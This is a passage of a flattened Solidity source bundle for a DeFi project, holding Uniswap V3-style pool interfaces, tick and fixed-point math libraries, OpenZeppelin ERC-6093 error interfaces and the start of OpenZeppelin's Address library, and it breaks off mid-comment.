    /// @param sender The address that initiated the swap call, and that received the callback
    /// @param recipient The address that received the output of the swap
    /// @param amount0 The delta of the token0 balance of the pool
    /// @param amount1 The delta of the token1 balance of the pool
    /// @param sqrtPriceX96 The sqrt(price) of the pool after the swap, as a Q64.96
    /// @param liquidity The liquidity of the pool after the swap
    /// @param tick The log base 1.0001 of price of the pool after the swap
    event Swap(
        address indexed sender,
        address indexed recipient,
        int256 amount0,
        int256 amount1,
        uint160 sqrtPriceX96,
        uint128 liquidity,
        int24 tick
    );

    /// @notice Emitted when fees are earned
    /// @param amount0 The amount of token0 fees earned
    /// @param amount1 The amount of token1 fees earned
    event ProtocolFeesEarned(uint128 amount0, uint128 amount1);

    /// @notice Emitted by the pool for any flashes of token0/token1
    /// @param sender The address that initiated the swap call, and that received the callback
    /// @param recipient The address that received the tokens from flash
    /// @param amount0 The amount of token0 that was flashed
    /// @param amount1 The amount of token1 that was flashed
    /// @param paid0 The amount of token0 paid for the flash, which can exceed the amount0 plus the fee
    /// @param paid1 The amount of token1 paid for the flash, which can exceed the amount1 plus the fee
    event Flash(
        address indexed sender,
        address indexed recipient,
        uint256 amount0,
        uint256 amount1,
        uint256 paid0,
        uint256 paid1
    );

    /// @notice Emitted by the pool for increases to the number of observations that can be stored
    /// @dev observationCardinalityNext is not the observation cardinality until an observation is written at the index
    /// just before a mint/swap/burn.
    /// @param observationCardinalityNextOld The previous value of the next observation cardinality
    /// @param observationCardinalityNextNew The updated value of the next observation cardinality
    event IncreaseObservationCardinalityNext(
        uint16 observationCardinalityNextOld, uint16 observationCardinalityNextNew
    );

    /// @notice Emitted when the protocol fee is changed by the pool
    /// @param feeProtocol0Old The previous value of the token0 protocol fee
    /// @param feeProtocol1Old The previous value of the token1 protocol fee
    /// @param feeProtocol0New The updated value of the token0 protocol fee
    /// @param feeProtocol1New The updated value of the token1 protocol fee
    event SetFeeProtocol(
        uint32 feeProtocol0Old, uint32 feeProtocol1Old, uint32 feeProtocol0New, uint32 feeProtocol1New
    );

    /// @notice Emitted when the collected protocol fees are withdrawn by the factory owner
    /// @param sender The address that collects the protocol fees
    /// @param recipient The address that receives the collected protocol fees
    /// @param amount0 The amount of token0 protocol fees that is withdrawn
    /// @param amount0 The amount of token1 protocol fees that is withdrawn
    event CollectProtocol(address indexed sender, address indexed recipient, uint128 amount0, uint128 amount1);
}

// src/single/integrations/kodiak/pool/IUniswapV3PoolImmutables.sol

/// @title Pool state that never changes
/// @notice These parameters are fixed for a pool forever, i.e., the methods will always return the same values
interface IUniswapV3PoolImmutables {
    /// @notice The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface
    /// @return The contract address
    function factory() external view returns (address);

    /// @notice The first of the two tokens of the pool, sorted by address
    /// @return The token contract address
    function token0() external view returns (address);

    /// @notice The second of the two tokens of the pool, sorted by address
    /// @return The token contract address
    function token1() external view returns (address);

    /// @notice The pool's fee in hundredths of a bip, i.e. 1e-6
    /// @return The fee
    function fee() external view returns (uint24);

    /// @notice The pool tick spacing
    /// @dev Ticks can only be used at multiples of this value, minimum of 1 and always positive
    /// e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ...
    /// This value is an int24 to avoid casting even though it is always positive.
    /// @return The tick spacing
    function tickSpacing() external view returns (int24);

    /// @notice The maximum amount of position liquidity that can use any tick in the range
    /// @dev This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and
    /// also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool
    /// @return The max amount of liquidity per tick
    function maxLiquidityPerTick() external view returns (uint128);
}

// src/single/integrations/kodiak/pool/IUniswapV3PoolOwnerActions.sol

/// @title Permissioned pool actions
/// @notice Contains pool methods that may only be called by the factory owner
interface IUniswapV3PoolOwnerActions {
    /// @notice Set the denominator of the protocol's % share of the fees
    /// @param feeProtocol0 new protocol fee for token0 of the pool
    /// @param feeProtocol1 new protocol fee for token1 of the pool
    function setFeeProtocol(uint32 feeProtocol0, uint32 feeProtocol1) external;

    /// @notice Collect the protocol fee accrued to the pool
    /// @param recipient The address to which collected protocol fees should be sent
    /// @param amount0Requested The maximum amount of token0 to send, can be 0 to collect fees in only token1
    /// @param amount1Requested The maximum amount of token1 to send, can be 0 to collect fees in only token0
    /// @return amount0 The protocol fee collected in token0
    /// @return amount1 The protocol fee collected in token1
    function collectProtocol(address recipient, uint128 amount0Requested, uint128 amount1Requested)
        external
        returns (uint128 amount0, uint128 amount1);
}

// src/single/integrations/kodiak/pool/IUniswapV3PoolState.sol

/// @title Pool state that can change
/// @notice These methods compose the pool's state, and can change with any frequency including multiple times
/// per transaction
interface IUniswapV3PoolState {
    /// @notice The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas
    /// when accessed externally.
    /// @return sqrtPriceX96 The current price of the pool as a sqrt(token1/token0) Q64.96 value
    /// tick The current tick of the pool, i.e. according to the last tick transition that was run.
    /// This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick
    /// boundary.
    /// observationIndex The index of the last oracle observation that was written,
    /// observationCardinality The current maximum number of observations stored in the pool,
    /// observationCardinalityNext The next maximum number of observations, to be updated when the observation.
    /// feeProtocol The protocol fee for both tokens of the pool.
    /// Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0
    /// is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee.
    /// unlocked Whether the pool is currently locked to reentrancy
    function slot0()
        external
        view
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint32 feeProtocol,
            bool unlocked
        );

    /// @notice The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool
    /// @dev This value can overflow the uint256
    function feeGrowthGlobal0X128() external view returns (uint256);

    /// @notice The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool
    /// @dev This value can overflow the uint256
    function feeGrowthGlobal1X128() external view returns (uint256);

    /// @notice The amounts of token0 and token1 that are owed to the protocol
    /// @dev Protocol fees will never exceed uint128 max in either token
    function protocolFees() external view returns (uint128 token0, uint128 token1);

    /// @notice The currently in range liquidity available to the pool
    /// @dev This value has no relationship to the total liquidity across all ticks
    function liquidity() external view returns (uint128);

    /// @notice Look up information about a specific tick in the pool
    /// @param tick The tick to look up
    /// @return liquidityGross the total amount of position liquidity that uses the pool either as tick lower or
    /// tick upper,
    /// liquidityNet how much liquidity changes when the pool price crosses the tick,
    /// feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0,
    /// feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1,
    /// tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick
    /// secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick,
    /// secondsOutside the seconds spent on the other side of the tick from the current tick,
    /// initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false.
    /// Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0.
    /// In addition, these values are only relative and must be used only in comparison to previous snapshots for
    /// a specific position.
    function ticks(int24 tick)
        external
        view
        returns (
            uint128 liquidityGross,
            int128 liquidityNet,
            uint256 feeGrowthOutside0X128,
            uint256 feeGrowthOutside1X128,
            int56 tickCumulativeOutside,
            uint160 secondsPerLiquidityOutsideX128,
            uint32 secondsOutside,
            bool initialized
        );

    /// @notice Returns 256 packed tick initialized boolean values. See TickBitmap for more information
    function tickBitmap(int16 wordPosition) external view returns (uint256);

    /// @notice Returns the information about a position by the position's key
    /// @param key The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper
    /// @return _liquidity The amount of liquidity in the position,
    /// Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke,
    /// Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke,
    /// Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke,
    /// Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke
    function positions(bytes32 key)
        external
        view
        returns (
            uint128 _liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        );

    /// @notice Returns data about a specific observation index
    /// @param index The element of the observations array to fetch
    /// @dev You most likely want to use #observe() instead of this method to get an observation as of some amount of time
    /// ago, rather than at a specific index in the array.
    /// @return blockTimestamp The timestamp of the observation,
    /// Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp,
    /// Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp,
    /// Returns initialized whether the observation has been initialized and the values are safe to use
    function observations(uint256 index)
        external
        view
        returns (
            uint32 blockTimestamp,
            int56 tickCumulative,
            uint160 secondsPerLiquidityCumulativeX128,
            bool initialized
        );
}

// src/single/integrations/kodiak/pool/IUniswapV3SwapCallback.sol

/// @title Callback for IUniswapV3PoolActions#swap
/// @notice Any contract that calls IUniswapV3PoolActions#swap must implement this interface
interface IUniswapV3SwapCallback {
    /// @notice Called to `msg.sender` after executing a swap via IUniswapV3Pool#swap.
    /// @dev In the implementation you must pay the pool tokens owed for the swap.
    /// The caller of this method must be checked to be a UniswapV3Pool deployed by the canonical UniswapV3Factory.
    /// amount0Delta and amount1Delta can both be 0 if no tokens were swapped.
    /// @param amount0Delta The amount of token0 that was sent (negative) or must be received (positive) by the pool by
    /// the end of the swap. If positive, the callback must send that amount of token0 to the pool.
    /// @param amount1Delta The amount of token1 that was sent (negative) or must be received (positive) by the pool by
    /// the end of the swap. If positive, the callback must send that amount of token1 to the pool.
    /// @param data Any data passed through by the caller via the IUniswapV3PoolActions#swap call
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

// src/single/integrations/uniswap/TickMath.sol

/// @title Math library for computing sqrt prices from ticks and vice versa
/// @notice Computes sqrt price for ticks of size 1.0001, i.e. sqrt(1.0001^tick) as fixed point Q64.96 numbers. Supports
/// prices between 2**-128 and 2**128
library TickMath {
    /// @dev The minimum tick that may be passed to #getSqrtRatioAtTick computed from log base 1.0001 of 2**-128
    int24 internal constant MIN_TICK = -887272;
    /// @dev The maximum tick that may be passed to #getSqrtRatioAtTick computed from log base 1.0001 of 2**128
    int24 internal constant MAX_TICK = -MIN_TICK;

    /// @dev The minimum value that can be returned from #getSqrtRatioAtTick. Equivalent to getSqrtRatioAtTick(MIN_TICK)
    uint160 internal constant MIN_SQRT_RATIO = 4295128739;
    /// @dev The maximum value that can be returned from #getSqrtRatioAtTick. Equivalent to getSqrtRatioAtTick(MAX_TICK)
    uint160 internal constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;

    /// @notice Calculates sqrt(1.0001^tick) * 2^96
    /// @dev Throws if |tick| > max tick
    /// @param tick The input tick for the above formula
    /// @return sqrtPriceX96 A Fixed point Q64.96 number representing the sqrt of the ratio of the two assets (token1/token0)
    /// at the given tick
    function getSqrtRatioAtTick(int24 tick) internal pure returns (uint160 sqrtPriceX96) {
        uint256 absTick = tick < 0 ? uint256(-int256(tick)) : uint256(int256(tick));
        require(absTick <= uint256(uint24(MAX_TICK)), "T");

        uint256 ratio = absTick & 0x1 != 0 ? 0xfffcb933bd6fad37aa2d162d1a594001 : 0x100000000000000000000000000000000;
        if (absTick & 0x2 != 0) ratio = (ratio * 0xfff97272373d413259a46990580e213a) >> 128;
        if (absTick & 0x4 != 0) ratio = (ratio * 0xfff2e50f5f656932ef12357cf3c7fdcc) >> 128;
        if (absTick & 0x8 != 0) ratio = (ratio * 0xffe5caca7e10e4e61c3624eaa0941cd0) >> 128;
        if (absTick & 0x10 != 0) ratio = (ratio * 0xffcb9843d60f6159c9db58835c926644) >> 128;
        if (absTick & 0x20 != 0) ratio = (ratio * 0xff973b41fa98c081472e6896dfb254c0) >> 128;
        if (absTick & 0x40 != 0) ratio = (ratio * 0xff2ea16466c96a3843ec78b326b52861) >> 128;
        if (absTick & 0x80 != 0) ratio = (ratio * 0xfe5dee046a99a2a811c461f1969c3053) >> 128;
        if (absTick & 0x100 != 0) ratio = (ratio * 0xfcbe86c7900a88aedcffc83b479aa3a4) >> 128;
        if (absTick & 0x200 != 0) ratio = (ratio * 0xf987a7253ac413176f2b074cf7815e54) >> 128;
        if (absTick & 0x400 != 0) ratio = (ratio * 0xf3392b0822b70005940c7a398e4b70f3) >> 128;
        if (absTick & 0x800 != 0) ratio = (ratio * 0xe7159475a2c29b7443b29c7fa6e889d9) >> 128;
        if (absTick & 0x1000 != 0) ratio = (ratio * 0xd097f3bdfd2022b8845ad8f792aa5825) >> 128;
        if (absTick & 0x2000 != 0) ratio = (ratio * 0xa9f746462d870fdf8a65dc1f90e061e5) >> 128;
        if (absTick & 0x4000 != 0) ratio = (ratio * 0x70d869a156d2a1b890bb3df62baf32f7) >> 128;
        if (absTick & 0x8000 != 0) ratio = (ratio * 0x31be135f97d08fd981231505542fcfa6) >> 128;
        if (absTick & 0x10000 != 0) ratio = (ratio * 0x9aa508b5b7a84e1c677de54f3e99bc9) >> 128;
        if (absTick & 0x20000 != 0) ratio = (ratio * 0x5d6af8dedb81196699c329225ee604) >> 128;
        if (absTick & 0x40000 != 0) ratio = (ratio * 0x2216e584f5fa1ea926041bedfe98) >> 128;
        if (absTick & 0x80000 != 0) ratio = (ratio * 0x48a170391f7dc42444e8fa2) >> 128;

        if (tick > 0) ratio = type(uint256).max / ratio;

        // this divides by 1<<32 rounding up to go from a Q128.128 to a Q128.96.
        // we then downcast because we know the result always fits within 160 bits due to our tick input constraint
        // we round up in the division so getTickAtSqrtRatio of the output price is always consistent
        sqrtPriceX96 = uint160((ratio >> 32) + (ratio % (1 << 32) == 0 ? 0 : 1));
    }

    /// @notice Calculates the greatest tick value such that getRatioAtTick(tick) <= ratio
    /// @dev Throws in case sqrtPriceX96 < MIN_SQRT_RATIO, as MIN_SQRT_RATIO is the lowest value getRatioAtTick may
    /// ever return.
    /// @param sqrtPriceX96 The sqrt ratio for which to compute the tick as a Q64.96
    /// @return tick The greatest tick for which the ratio is less than or equal to the input ratio
    function getTickAtSqrtRatio(uint160 sqrtPriceX96) internal pure returns (int24 tick) {
        // second inequality must be < because the price can never reach the price at the max tick
        require(sqrtPriceX96 >= MIN_SQRT_RATIO && sqrtPriceX96 < MAX_SQRT_RATIO, "R");
        uint256 ratio = uint256(sqrtPriceX96) << 32;

        uint256 r = ratio;
        uint256 msb = 0;

        assembly {
            let f := shl(7, gt(r, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF))
            msb := or(msb, f)
            r := shr(f, r)
        }
        assembly {
            let f := shl(6, gt(r, 0xFFFFFFFFFFFFFFFF))
            msb := or(msb, f)
            r := shr(f, r)
        }
        assembly {
            let f := shl(5, gt(r, 0xFFFFFFFF))
            msb := or(msb, f)
            r := shr(f, r)
        }
        assembly {
            let f := shl(4, gt(r, 0xFFFF))
            msb := or(msb, f)
            r := shr(f, r)
        }
        assembly {
            let f := shl(3, gt(r, 0xFF))
            msb := or(msb, f)
            r := shr(f, r)
        }
        assembly {
            let f := shl(2, gt(r, 0xF))
            msb := or(msb, f)
            r := shr(f, r)
        }
        assembly {
            let f := shl(1, gt(r, 0x3))
            msb := or(msb, f)
            r := shr(f, r)
        }
        assembly {
            let f := gt(r, 0x1)
            msb := or(msb, f)
        }

        if (msb >= 128) r = ratio >> (msb - 127);
        else r = ratio << (127 - msb);

        int256 log_2 = (int256(msb) - 128) << 64;

        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(63, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(62, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(61, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(60, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(59, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(58, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(57, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(56, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(55, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(54, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(53, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(52, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(51, f))
            r := shr(f, r)
        }
        assembly {
            r := shr(127, mul(r, r))
            let f := shr(128, r)
            log_2 := or(log_2, shl(50, f))
        }

        int256 log_sqrt10001 = log_2 * 255738958999603826347141; // 128.128 number

        int24 tickLow = int24((log_sqrt10001 - 3402992956809132418596140100660247210) >> 128);
        int24 tickHi = int24((log_sqrt10001 + 291339464771989622907027621153398088495) >> 128);

        tick = tickLow == tickHi
            ? tickLow
            : getSqrtRatioAtTick(tickHi) <= sqrtPriceX96
                ? tickHi
                : tickLow;
    }
}

// src/single/TickRange.sol

using TickRangeImpl for TickRange global;

/// Defines the tick range of an AMM position.
struct TickRange {
    /// Lower tick of the range.
    int24 lower;
    /// Upper tick of the range.
    int24 upper;
}

/// Implementation library for TickRange.
library TickRangeImpl {
    /// @notice Checks whether the given range is encoded to represent the island.
    /// @param range The range to check.
    /// @return isIsland True if the range is for an island.
    function isIsland(TickRange memory range) internal pure returns (bool) {
        return range.lower == 0 && range.upper == 0;
    }
}

// lib/Commons/src/Math/UnsafeMath.sol

/// @title Math functions that do not check inputs or outputs
/// @notice Contains methods that perform common math functions but do not do any overflow or underflow checks
library UnsafeMath {
    /// @notice Returns ceil(x / y)
    /// @dev division by 0 returns 0
    /// @param x The dividend
    /// @param y The divisor
    /// @return z The quotient, ceil(x / y)
    function divRoundingUp(uint256 x, uint256 y) internal pure returns (uint256 z) {
        assembly {
            z := add(div(x, y), gt(mod(x, y), 0))
        }
    }
}

// lib/Commons/src/Math/Utils.sol

library MathUtils {
    /// Constants for masking in calculating MSB.
    uint256 public constant SHIFT128 = ((1 << 128) - 1) << 128;
    uint256 public constant SHIFT64 = ((1 << 64) - 1) << 64;
    uint256 public constant SHIFT32 = ((1 << 32) - 1) << 32;
    uint256 public constant SHIFT16 = ((1 << 16) - 1) << 16;
    uint256 public constant SHIFT8 = ((1 << 8) - 1) << 8;
    uint256 public constant SHIFT4 = ((1 << 4) - 1) << 4;
    uint256 public constant SHIFT2 = ((1 << 2) - 1) << 2;
    uint256 public constant SHIFT1 = 0x2;

    function abs(int256 self) internal pure returns (int256) {
        return self >= 0 ? self : -self;
    }

    /// @notice Calculates the square root of x using the Babylonian method.
    ///
    /// @dev See https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method.
    /// Copied from PRBMath: https://github.com/PaulRBerg/prb-math/blob/83b3a0dcd4aaca779d0632118772f00611340e79/src/Common.sol
    ///
    /// Notes:
    /// - If x is not a perfect square, the result is rounded down.
    /// - Credits to OpenZeppelin for the explanations in comments below.
    ///
    /// @param x The uint256 number for which to calculate the square root.
    /// @return result The result as a uint256.
    /// @custom:smtchecker abstract-function-nondet
    function sqrt(uint256 x) internal pure returns (uint256 result) {
        if (x == 0) {
            return 0;
        }

        // For our first guess, we calculate the biggest power of 2 which is smaller than the square root of x.
        //
        // We know that the "msb" (most significant bit) of x is a power of 2 such that we have:
        //
        // $$
        // msb(x) <= x <= 2*msb(x)$
        // $$
        //
        // We write $msb(x)$ as $2^k$, and we get:
        //
        // $$
        // k = log_2(x)
        // $$
        //
        // Thus, we can write the initial inequality as:
        //
        // $$
        // 2^{log_2(x)} <= x <= 2*2^{log_2(x)+1}
        // sqrt(2^k) <= sqrt(x) < sqrt(2^{k+1})
        // 2^{k/2} <= sqrt(x) < 2^{(k+1)/2} <= 2^{(k/2)+1}
        // $$
        //
        // Consequently, $2^{log_2(x) /2} is a good first approximation of sqrt(x) with at least one correct bit.
        uint256 xAux = uint256(x);
        result = 1;
        if (xAux >= 2 ** 128) {
            xAux >>= 128;
            result <<= 64;
        }
        if (xAux >= 2 ** 64) {
            xAux >>= 64;
            result <<= 32;
        }
        if (xAux >= 2 ** 32) {
            xAux >>= 32;
            result <<= 16;
        }
        if (xAux >= 2 ** 16) {
            xAux >>= 16;
            result <<= 8;
        }
        if (xAux >= 2 ** 8) {
            xAux >>= 8;
            result <<= 4;
        }
        if (xAux >= 2 ** 4) {
            xAux >>= 4;
            result <<= 2;
        }
        if (xAux >= 2 ** 2) {
            result <<= 1;
        }

        // At this point, `result` is an estimation with at least one bit of precision. We know the true value has at
        // most 128 bits, since it is the square root of a uint256. Newton's method converges quadratically (precision
        // doubles at every iteration). We thus need at most 7 iteration to turn our partial result with one bit of
        // precision into the expected uint128 result.
        unchecked {
            result = (result + x / result) >> 1;
            result = (result + x / result) >> 1;
            result = (result + x / result) >> 1;
            result = (result + x / result) >> 1;
            result = (result + x / result) >> 1;
            result = (result + x / result) >> 1;
            result = (result + x / result) >> 1;

            // If x is not a perfect square, round the result toward zero.
            uint256 roundedResult = x / result;
            if (result >= roundedResult) {
                result = roundedResult;
            }
        }
    }

    /// Get an X256 number representing the ratio of a/b where a < b.
    /// This rounds down. Generally, you'll want to multiply this ratio with another value through X256.mul256.
    /// @dev b must be greater than 1.
    /// @dev BE AWARE OF WHEN THIS IS INACCURATE. THERE ARE VERY RARE INSTANCES WHERE THIS IS APPROPRIATE.
    /// The inaccuracy is significant.
    /// @custom:gas 104
    function percentX256(uint256 a, uint256 b) internal pure returns (uint256 ratioX256) {
        if (a == b) return uint256(int256(-1));
        /// We actually compute 2^256 / b first extremely cheaply. ~20 gas
        require(b > 1, "0");
        assembly {
            ratioX256 := add(div(sub(0, b), b), 1)
            ratioX256 := mul(a, ratioX256)
        }
        // The multiplication always fits since a < b
    }

    /// Calculate the most significant bit's place, 0th indexed.
    /// @dev Also returns 0 if the input is 0.
    function msb(uint256 x) internal pure returns (uint8 place) {
        if (x == 0) return 0;

        if ((x & SHIFT128) != 0) {
            place += 128;
            x >>= 128;
        }

        if ((x & SHIFT64) != 0) {
            place += 64;
            x >>= 64;
        }

        if ((x & SHIFT32) != 0) {
            place += 32;
            x >>= 32;
        }

        if ((x & SHIFT16) != 0) {
            place += 16;
            x >>= 16;
        }

        if ((x & SHIFT8) != 0) {
            place += 8;
            x >>= 8;
        }

        if ((x & SHIFT4) != 0) {
            place += 4;
            x >>= 4;
        }

        if ((x & SHIFT2) != 0) {
            place += 2;
            x >>= 2;
        }

        if ((x & SHIFT1) != 0) {
            place += 1;
            x >>= 1;
        }
    }
}

// lib/openzeppelin-contracts/contracts/interfaces/draft-IERC6093.sol

// OpenZeppelin Contracts (last updated v5.1.0) (interfaces/draft-IERC6093.sol)

/**
 * @dev Standard ERC-20 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.
 */
interface IERC20Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC20InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC20InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     * @param allowance Amount of tokens a `spender` is allowed to operate with.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC20InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC20InvalidSpender(address spender);
}

/**
 * @dev Standard ERC-721 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-721 tokens.
 */
interface IERC721Errors {
    /**
     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in ERC-20.
     * Used in balance queries.
     * @param owner Address of the current owner of a token.
     */
    error ERC721InvalidOwner(address owner);

    /**
     * @dev Indicates a `tokenId` whose `owner` is the zero address.
     * @param tokenId Identifier number of a token.
     */
    error ERC721NonexistentToken(uint256 tokenId);

    /**
     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param tokenId Identifier number of a token.
     * @param owner Address of the current owner of a token.
     */
    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC721InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC721InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param tokenId Identifier number of a token.
     */
    error ERC721InsufficientApproval(address operator, uint256 tokenId);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC721InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC721InvalidOperator(address operator);
}

/**
 * @dev Standard ERC-1155 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-1155 tokens.
 */
interface IERC1155Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     * @param tokenId Identifier number of a token.
     */
    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC1155InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC1155InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param owner Address of the current owner of a token.
     */
    error ERC1155MissingApprovalForAll(address operator, address owner);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC1155InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC1155InvalidOperator(address operator);

    /**
     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.
     * Used in batch transfers.
     * @param idsLength Length of the array of token identifiers
     * @param valuesLength Length of the array of token amounts
     */
    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
}

// lib/openzeppelin-contracts/contracts/utils/Address.sol

// OpenZeppelin Contracts (last updated v5.1.0) (utils/Address.sol)

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev There's no code at `target` (it is not a contract).
     */
    error AddressEmptyCode(address target);

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.8.20/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        if (address(this).balance < amount) {
            revert Errors.InsufficientBalance(address(this).balance, amount);
        }

        (bool success, ) = recipient.call{value: amount}("");
        if (!success) {
            revert Errors.FailedCall();
        }
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason or custom error, it is bubbled
